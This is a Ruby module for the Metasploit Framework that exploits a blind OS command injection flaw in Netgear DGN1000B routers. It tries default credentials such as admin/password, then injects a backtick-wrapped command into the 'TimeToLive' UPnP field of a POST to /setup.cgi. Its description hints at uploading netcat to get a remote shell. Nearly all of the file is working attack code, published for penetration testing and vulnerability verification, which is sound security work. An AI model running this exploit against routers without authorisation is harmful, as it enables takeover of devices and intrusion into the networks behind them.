##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Netgear DGN1000B Remote OS Command Execution',
			'Description'     => %q{
					Some Netgear Routers are vulnerable to OS Command injection.
				You will need credentials to the webinterface to access the vulnerable part
				of the application. Default credentials are always a good starting point.
				admin/admin or admin/password could be a first try.
				Note: This is a blind os command injection vulnerability. This means that you will
				not see any output of your command. Try a ping command to your local system for a
				first test.

				Hint: To get a remote shell you could upload a netcat binary and exec it.
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.netgear.de/products/home/wireless_routers/simplesharing/dgn1000.aspx' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-005' ],
					[ 'BID', '57836' ],
					[ 'EDB', '24464' ],
					[ 'OSVDB', '89985' ]
				],
			'DisclosureDate' => 'Feb 06 2013'))

		register_options(
			[
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
			], self.class)
	end

	def run
		uri = '/setup.cgi'
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		begin
			res = send_request_cgi({
					'uri'     => uri,
					'method'  => 'GET',
					'authorization' => basic_auth(user,pass)
					})

			return if res.nil?
			return if (res.code == 404)
			if [200, 301, 302].include?(res.code)
				vprint_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end

		vprint_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		cmd = datastore['CMD']

		#original request:
		#data_cmd = "UPnP=UPnP&AdverTime=30&TimeToLive=%60#{cmd}%60&save=+Anwenden&todo=save&
		#this_file=upnp.htm&next_file=upnp.htm&h_UPnP=enable&hiddenAdverTime=30&hiddenTimeToLive=4"

		vprint_status("#{rhost}:#{rport} - Using the following target URL: #{uri}")

		begin
			res = send_request_cgi(
				{
					'uri'	=> uri,
					'method' => 'POST',
					'authorization' => basic_auth(user,pass),
					'vars_post' => {
						"UPnP" => "UPnP",
						"AdverTime" => "30",
						"TimeToLive" => "`#{cmd}`",
						"save" => "+Anwenden",
						"todo" => "save",
						"this_file" => "upnp.htm",
						"next_file" => "upnp.htm",
						"h_UPnP" => "enable",
						"hiddenAdverTime" => "30",
						"hiddenTimeToLive" => "4"
						}
				})
			return if res.nil?
			return if (res.code == 404)

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end
		vprint_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
	end
end
